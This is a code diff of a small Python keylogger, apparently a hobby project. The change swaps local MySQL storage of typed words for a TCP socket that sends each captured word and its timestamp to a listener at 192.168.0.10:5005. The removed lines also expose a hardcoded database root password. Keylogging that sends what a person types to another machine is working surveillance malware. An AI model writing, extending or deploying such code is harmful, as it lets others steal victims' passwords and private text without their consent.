@@ -1,27 +1,23 @@
 from pynput import keyboard
-import mysql.connector	
-import mysql.connector
 import time
+import socket
 
-mydb = mysql.connector.connect(
-  host="localhost",
-  user="root",
-  passwd="sameed123",
-  database="pylogger"
-)
-mycursor = mydb.cursor()	
+TCP_IP = '192.168.0.10'
+TCP_PORT = 5005
+BUFFER_SIZE = 1024
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((TCP_IP, TCP_PORT))
+# l="Connection is Up and Running"
+# client.send(l.encode())
+# data = client.recv(BUFFER_SIZE).decode()
+
 def on_release(key):
     letter = key
     if letter == keyboard.Key.tab:	
-        sql = "DELETE FROM words" 
-        mycursor.execute(sql)
-        mydb.commit()
-        sql = "ALTER TABLE words AUTO_INCREMENT = 1"
-        mycursor.execute(sql)
-        mydb.commit()
+        client.close()
         return False
 letters = []
-words = []
 def log(key):		 
 	letter = key
 	if letter != keyboard.Key.space and letter != keyboard.Key.enter and letter != keyboard.Key.tab and letter != keyboard.Key.up and letter != keyboard.Key.left and letter != keyboard.Key.right and letter != keyboard.Key.down and letter != keyboard.Key.backspace:	
@@ -35,14 +31,14 @@ def log(key):
 		time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
 		word = ''.join(map(str, letters))
 		word = word.replace("'","")
-		sql = "INSERT INTO words (word, typed) VALUES (%s, %s)"
-		val = (word, time_string)
-		mycursor.execute(sql, val)
-		mydb.commit()
-		print("1 record inserted, ID:", mycursor.lastrowid)	
+		word = word+"  --  "+time_string
+		print(word)
+		client.send(word.encode())
+		data = client.recv(BUFFER_SIZE).decode()
+		
 		del letters[:]
 	print(letters)
-	print(words)
+	
 
 with keyboard.Listener(
         on_press=log,
